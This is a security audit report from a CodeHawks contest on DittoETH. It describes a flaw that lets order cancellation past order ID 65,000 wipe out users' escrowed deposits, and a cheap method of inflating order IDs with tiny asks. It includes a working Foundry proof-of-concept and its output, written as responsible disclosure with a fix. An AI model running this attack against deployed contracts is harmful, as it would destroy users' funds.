---
tags:
  - lang/solidity
  - platform/codehawks
  - has/github
  - has/poc
  - severity/high
  - sector/governance
protocol: "[[DittoETH]]"
auditors:
  - "[[flacko]]"
genome:
  - "[[single-function]]"
  - "[[direct-drain]]"
  - "[[reentrancy-guard]]"
---
#  Users Lose Funds and Market Functionality Breaks When Market Reachs 65k Id

- id: 27443
- impact: HIGH
- protocol: [[DittoETH]]
- reporter: flacko (Codehawks)
- source: N/A

## Summary


This bug report describes a vulnerability in a system that allows users to create limit orders for buying and selling assets. When the orderbook for any market reaches 65,000 orders, the DAO (Decentralized Autonomous Organization) can call a function to cancel up to 1000 orders, or any user can cancel the last order in one call. The users who issued the cancelled orders will lose their deposits, and the cancelled process is not limited to a certain number of orders.

The vulnerability is related to the function cancelOrderFarFromOracle in the contracts/facets/OrderFacet.sol file. When a user creates a limit order, the assets amount or ETH amount used to create the order is taken from the user's virtual balance in the system. If there is no ID recycled behind the Head, the ID for this order will be the current ID in s.asset[asset].orderId and the s.asset[asset].orderId will be incremented by one.

When the order ID reaches 65k for a specific market, the DAO is able to cancel the last 1000 orders, or any user can cancel the last order in one call. The user's balance is decreased by the value of their order, but since the order is set to cancelled, they never receive their amount back. There is also no limit for how many orders can be cancelled. A malicious actor can target this vulnerability by creating numerous tiny limit asks, pushing the order ID to be too high.

A proof of concept (POC) was provided in the report, which shows how a malicious user can fill the orderbook with a bunch of tiny limit asks with little cost and how all orders can be cancelled if the order ID reaches 65k. It also shows that there is no refund for the users that created these orders.

## Details

### Relevant GitHub Links
<a data-meta="codehawks-github-link" href="https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/OrdersFacet.sol#L124C9-L124C9">https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/OrdersFacet.sol#L124C9-L124C9</a>


## Summary

if the orderbook of any market reach 65,000 **dao** can call the function [cancelOrderFarFromOracle](https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/OrdersFacet.sol#L124C10-L124C10) multiple times to cancel many orders up to 1000 order in each transaction ,or anyone can cancle the last order in one **call**.the users who issued the canclled orders will lost thier deposits.and the canclled process is not limited to a certain orders numbers.

## Vulnerability Details

**source** : contracts/facets/OrderFacet.sol </br>
**Function** : [cancelOrderFarFromOracle](https://github.com/Cyfrin/2023-09-ditto/blob/main/contracts/facets/OrdersFacet.sol#L124C10-L124C10)

- when ever a user create a limit order (_short limit_,_bid limit_,_ask limit_), if the order did not match it get added to the orderbook, and the `assets amount` or `eth amount` uses to create this order is taken from the _Virtual balance_ of the user in the system .</br> **userVault**(in case of bids and shorts) or **userAsset**(in case of asks) we can see that here :
- ```solidity
        // for asks:
        s.assetUser[asset][order.addr].ercEscrowed -= order.ercAmount;
        // for shorts :
        s.vaultUser[vault][order.addr].ethEscrowed -= eth;
        //for bids :
        s.vaultUser[vault][order.addr].ethEscrowed -= eth;
  ```

  also if there is no id's Recycled behind the **Head** the id for this orders gonna be the current id in `s.asset[asset].orderId`,and the `s.asset[asset].orderId` get increamented by one . this is true for all three types of orders. (shorts,asks,bids).

  - now in case this **ordersId** reach 65k for a specific market, the **DAO** are able to cancle the last 1000 order, and any one can cancle last order in one call. since it's only checks for the **ordersId** > 65000.and by the last order i mean the last order of any time of limit orders (`asks`,`shorts`,`bids`).

    ```solidity
    function cancelOrderFarFromOracle(address asset, O orderType, uint16 lastOrderId, uint16 numOrdersToCancel)
        external
        onlyValidAsset(asset)
        nonReentrant
    {
        if (s.asset[asset].orderId < 65000) {
            revert Errors.OrderIdCountTooLow();
        }

        if (numOrdersToCancel > 1000) {
            revert Errors.CannotCancelMoreThan1000Orders();
        }

        if (msg.sender == LibDiamond.diamondStorage().contractOwner) {
            if (orderType == O.LimitBid && s.bids[asset][lastOrderId].nextId == Constants.TAIL) {
                s.bids.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);
            } else if (orderType == O.LimitAsk && s.asks[asset][lastOrderId].nextId == Constants.TAIL) {
                s.asks.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);
            } else if (orderType == O.LimitShort && s.shorts[asset][lastOrderId].nextId == Constants.TAIL) {
                s.shorts.cancelManyOrders(asset, lastOrderId, numOrdersToCancel);
            } else {
                revert Errors.NotLastOrder();
            }
        } else {
            //@dev if address is not DAO, you can only cancel last order of a side
            if (orderType == O.LimitBid && s.bids[asset][lastOrderId].nextId == Constants.TAIL) {
                s.bids.cancelOrder(asset, lastOrderId);
            } else if (orderType == O.LimitAsk && s.asks[asset][lastOrderId].nextId == Constants.TAIL) {
                s.asks.cancelOrder(asset, lastOrderId);
            } else if (orderType == O.LimitShort && s.shorts[asset][lastOrderId].nextId == Constants.TAIL) {
                s.shorts.cancelOrder(asset, lastOrderId);
            } else {
                revert Errors.NotLastOrder();
            }
        }
    }
    ... ....
    // cancle many orders no extra checks  :
    function cancelManyOrders(
        mapping(address => mapping(uint16 => STypes.Order)) storage orders,
        address asset,
        uint16 lastOrderId,
        uint16 numOrdersToCancel
     ) internal {
        uint16 prevId;
        uint16 currentId = lastOrderId;
        for (uint8 i; i < numOrdersToCancel;) {
            prevId = orders[asset][currentId].prevId;
            LibOrders.cancelOrder(orders, asset, currentId);
            currentId = prevId;
            unchecked {
                ++i;
            }
        }
    }
    ...... .....
    // no extrac checks in  cancleOrder() function also. it set the order to Cancelled , remove it from the list, and Set it to be reused:
    function cancelOrder(mapping(address => mapping(uint16 => STypes.Order)) storage orders, address asset, uint16 id)
        internal
     {
        uint16 prevHEAD = orders[asset][Constants.HEAD].prevId;

        // remove the links of ID in the market
        // @dev (ID) is exiting, [ID] is inserted
        // BEFORE: PREV <-> (ID) <-> NEXT
        // AFTER : PREV <----------> NEXT
        orders[asset][orders[asset][id].nextId].prevId = orders[asset][id].prevId;
        orders[asset][orders[asset][id].prevId].nextId = orders[asset][id].nextId;

        // create the links using the other side of the HEAD
        emit Events.CancelOrder(asset, id, orders[asset][id].orderType);
        _reuseOrderIds(orders, asset, id, prevHEAD, O.Cancelled);
    }


    ```

- as we said the user balance get decreaced by the `value` of it's order he created. but since the order is set to cancelled the user never gonna be able to recieve thier amount back.cause cancelled orders can't be **matched** Neither **cancelled** again.
  - **_Ex_**: </br>
  - a user create a limit bid as follow : {`price: 0.0001 ether`, `amount: 10000 ether`}.
  - when this order get cancelled : the user will loose : 0.0001 \* 10000 = `1 ether` **ZETH** (or **ETH**)
    > the shorters will lose more then others since thier balance get decreaced by : **_PRICE_** \* **_AMOUNT_** \* **_MARGIN_**.
- The second issue is there is _no limit_ for how many orders can be cancelled. you can cancel the whole orders in a market that reaches **65K** **orderId**. `limits shorts` ,`limits asks` or `limit bids` .starting from the last one.since the only Conditionto be able to cancel orders is the asset order ID reached this number. and if it reachs it. it never decrease .even if there is alot of orders **behind head**(non active) to be reused.

- a malicious actor Can targeted this vulnerability by creating numerous tiny `limit asks` pushing the `orderId` to be too high .and he can do so by creating `ask` with a very high **price** and very **small amount** so he can pass the `MinEth` amount check, he can just with less then `1 cusd` (in case of cusd market) create a bunsh of `limit asks` orders .
## POC : 
- using the the main [repo](https://github.com/Cyfrin/2023-09-ditto) setup for testing , here a poc shows how a malicious user can fill the **orderbook** with bunsh of tiny `limit asks` with little cost. and how you can cancle all orders in case the **orderId** reachs 65k. also that there is no refund for the users that created this orders.
```solidity
// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.21;

import {Errors} from "contracts/libraries/Errors.sol";
import {Events} from "contracts/libraries/Events.sol";
import {STypes, MTypes, O} from "contracts/libraries/DataTypes.sol";
import {Constants} from "contracts/libraries/Constants.sol";
import "forge-std/console.sol";
import {OBFixture} from "test/utils/OBFixture.sol";
// import {console} from "contracts/libraries/console.sol";

contract POC is OBFixture {
   address[3] private bidders = [address(435433), address(423432523), address(522366)];
   address[3] private shorters = [address(243422243242), address(52353646324532), address(40099)];
    address attacker = address(3234);
   function setUp() public override {
       super.setUp();
   }

       // an attacker can fill the order book with a bunsh of asks that have too high price and low asset 
   function test_fillWithAsks() public {
    // create a bunsh of asks with a high price :
    depositUsd(attacker, DEFAULT_AMOUNT * 10000);
    uint balanceAssetBefore = diamond.getAssetBalance(asset,attacker);
        // minAsk = 0.0001 ether . 0.0001 ether = x * 1 , x =0.0001 ether * 1 ether
        vm.startPrank(attacker);
        for (uint i ; i< 1000 ;i++){
           createLimitAsk(  10**24, 10**10); 
        }
        vm.stopPrank();
        STypes.Order[] memory asks = diamond.getAsks(asset);
        console.log("tiny asks created : ", asks.length);
        console.log( "hack cost asset", balanceAssetBefore - diamond.getAssetBalance(asset,attacker));

   }
   function test_cancleOrders() public {
       //set the assetid to 60000;
       diamond.setOrderIdT(asset,64998);
       // create multiple bids and 1 shorts
       fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, bidders[0]); // id 64998
       fundLimitShortOpt(uint80(DEFAULT_PRICE)*4, DEFAULT_AMOUNT, shorters[0]); //id 64999
       fundLimitBidOpt(DEFAULT_PRICE*2, DEFAULT_AMOUNT, bidders[1]); // id 65000
       fundLimitBidOpt(DEFAULT_PRICE*3 , DEFAULT_AMOUNT, bidders[2]); //id 65001
       /* now we have the lists like this :
        - for bids : Head <- Head <->65001<->65000<->64998->Tail
        - for shorts: Head <- Head <->64999->Tail
        */

       //lets cancle the all the bids :
       canclebid(64998);
       //  - now : Head <-64998<-> Head <->65001<->65000->Tail
       uint s1 = vm.snapshot();
       vm.revertTo(s1);
       canclebid(65000);
       // - now : Head <-64998<->65000<-> Head <->65001->Tail
       uint s2 = vm.snapshot();
       vm.revertTo(s2);
       canclebid(65001);
       // - now : Head <-64998<->65000<->65001<-> Head ->Tail
       // let's check the  active bids :
       STypes.Order[] memory Afterbids = diamond.getBids(asset);
       // notice that we were able to delete all the bids even there was unActive ID's to be reused.
       assertTrue(Afterbids.length == 0);
       // also notice that the owners of this orders did not get refund thier zeth back that have been taken from them when they create this orders.

       for (uint i; i<bidders.length;i++){
        // check that there is no refund for the users : 
           uint ethUser = diamond.getZethBalance(vault,bidders[i]);
           console.log('balance of : ', bidders[i],ethUser);
           assertEq(ethUser ,0);
       }
       // also we can cancle the shorts and the asks, i don't wanna make POC to long , but this is the idea.you can cancle all the orders of a market if this market reach 65000,
       assertEq(diamond.getShorts(asset).length,1);
       diamond.cancelOrderFarFromOracle(asset, O.LimitShort, 64999, 1);
       assertEq(diamond.getShorts(asset).length,0);

   }
   function canclebid(uint16 id) public {
       diamond.cancelOrderFarFromOracle(asset, O.LimitBid, id, 1);
   }


}


```

- console after running test :

```sh
    [PASS] test_cancleOrders() (gas: 1218326)
Logs:
  balance of :  0x000000000000000000000000000000000006A4E9 0
  balance of :  0x00000000000000000000000000000000193d114b 0
  balance of :  0x000000000000000000000000000000000007f87E 0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 222.12ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
- for creating bunsh of tiny asks : 
```sh
[PASS] test_fillWithAsks() (gas: 860940067)
Logs:
  tiny asks created :  1000
  hack cost asset 10000000000000 (which is less then 1 cusd) 

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.17s
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
## impact :

1.  users will lose thier `zeth` or `Erc` pagged asset dependens on the order type .
2.  any type of orders in this market (`shorts`,`asks`,`bids`) can be effected and cancelled even if there is a lot of **non active** ids to be reused.
3.  the whole orders in a market can be canncelled without refunding the orders creators.

## tools used : 
manual review
## Recommendations :

before cancling the orders , check that there is no orders to be reuse or the diffrence between the current orderId (`s.asset[asset].orderId`) , and the orders to be reused (behind the Head) of this market are Greater then 65000.

```sudo
// sudo code recommand , but it's really depends on the team how to handle that:
 if (s.asset[asset].OrderId) - (shorts.unActiveIds + asks.unActiveIds + bids.unActiveIds) < 65k revert.
```
